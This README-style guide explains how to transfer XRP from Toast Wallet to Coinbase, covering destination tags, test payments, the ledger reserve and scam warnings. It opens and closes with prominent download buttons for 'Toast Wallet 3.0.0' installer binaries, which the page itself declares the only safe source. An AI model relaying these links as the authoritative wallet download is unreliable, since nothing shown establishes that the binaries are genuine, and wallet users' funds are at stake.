<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Transfer XRP from Toast Wallet to Coinbase</h1>

<p align="center">Send XRP to an exchange deposit address with the right tag.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

On Coinbase, open the XRP receive or deposit screen and copy both the address and the destination tag. In the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose Send, paste the address and tag, send a small test, then send the rest while leaving the reserve in your Toast account.

## 👀 You'll see this if

- You want to sell or trade XRP that is in Toast Wallet.
- Coinbase shows an address and a tag, and you want to get both right.
- You are not sure how much XRP you can actually send.
- A previous deposit to Coinbase did not show up.

## 🤔 Why it matters

Exchanges such as Coinbase identify deposits by destination tag. Missing or mistyped tags are the most common reason an exchange deposit goes missing. The XRP Ledger reserve is the second: part of your Toast balance cannot be sent while the account exists, so trying to send everything fails.

Exchange interfaces change over time, so the exact button names on Coinbase may differ. The principle stays the same: copy the address and the tag from the exchange itself, every time.

## 🧭 Before you start

Sign in to Coinbase on its official site or app. Find XRP and choose the option to receive or deposit. Read any notes Coinbase shows about network and tag requirements. In Toast Wallet, check your balance and the reserve.

## 🛠️ Fix: transfer step by step

1. **On Coinbase, open the XRP deposit screen.** Copy the address.
2. **Copy the destination tag** shown alongside it.
3. **In Toast Wallet, choose Send** from the account holding your XRP.
4. **Paste the Coinbase address.** Compare the first and last characters.
5. **Paste the destination tag.** Check every digit. More on tags in [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md).
6. **Enter a small test amount** and confirm with your passphrase.
7. **Wait for Coinbase to show the deposit.**
8. **Send the remaining amount**, keeping the reserve and a small amount for fees in Toast Wallet. Read [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md).

The general sending routine is in [send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md).

## 🧩 Real-world example

A user wants to convert some XRP to local currency. They open Coinbase, copy the XRP address and tag, and send 10 XRP from Toast Wallet. Coinbase shows the deposit after a short wait. They then send the bulk, leaving the reserve in Toast. Because they checked the tag twice, everything arrives on the first try.

## ⚠️ Common mistakes

- Forgetting the tag, or using a tag from a different exchange.
- Sending from Toast to a Coinbase address for a different network or asset.
- Trying to send the entire balance including the reserve.
- Answering direct messages from "Coinbase support" on social media.

## 🔁 If that did not work

- **The deposit is not showing.** Check the transaction in Toast Wallet's history and compare the address and tag. See [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md).
- **You forgot the tag.** Contact Coinbase through its official help centre with the transaction ID.
- **"Insufficient funds".** Reduce the amount to leave the reserve.

## 🛡️ Prevention

Always copy the address and tag fresh from Coinbase. Always send a test first. Never share your Toast passphrase, words or backup code with anyone, including exchange staff.

## 🔍 A closer look at exchange address books

Many exchanges, Coinbase included, now ask you to confirm deposit and withdrawal details more carefully than in the past. On the deposit side, the address and tag you see are tied to your exchange account. They may stay the same for a long time, but exchanges can change them, so the safest habit is to copy them fresh before each transfer.

When you later withdraw from the exchange back to Toast Wallet, you may be asked to add your Toast address to an address book, confirm by email or wait a short security period before the first withdrawal. These steps are there to protect you. Allow time for them rather than trying to rush a transfer.

## 🗂️ A calm transfer routine

1. Open Toast Wallet and note your spendable balance after the reserve.
2. Open Coinbase on its official site or app and copy the XRP address.
3. Copy the destination tag.
4. Paste both into Toast Wallet and check the address at both ends.
5. Send a small test and wait until Coinbase shows it.
6. Send the rest, leaving the reserve and a little extra.
7. Keep the transaction ID until Coinbase has credited the full amount.

Following the same seven steps every time makes the process almost automatic, and it keeps the two most common errors, a missing tag and an attempt to send the reserve, out of the picture. If anything looks different from what you expect at any step, stop and check before continuing.

Avoid doing a transfer in a hurry, for example while markets are moving quickly. Mistakes happen under pressure, and an extra few minutes for a test payment cost far less than a deposit that needs a support ticket.

## 🧠 Remember

Fresh address, fresh tag, small test, then the rest, with the reserve left behind. That pattern works for any exchange, not just Coinbase.

## ❓ FAQ

<details>
<summary>Do I need a tag for Coinbase?</summary>

Follow what Coinbase shows. If it displays a tag, it is required.

</details>

<details>
<summary>How long does it take?</summary>

The XRP payment confirms in seconds; the exchange may take longer to credit it.

</details>

<details>
<summary>Can I send XRP back from Coinbase to Toast?</summary>

Yes. Use your Toast `r` address as the withdrawal destination.

</details>

> [!WARNING]
> Real exchange staff never ask for your wallet's passphrase, words or backup code. Report any such request.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet destination tag guide](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-destination-tag-guide.md) | When a tag is required and what happens if it is missing. |
| [Send XRP with Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/send-xrp-with-toast-wallet.md) | Address, tag, amount and passphrase: a careful sending routine. |
| [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md) | Why part of the balance is locked by the XRP Ledger. |
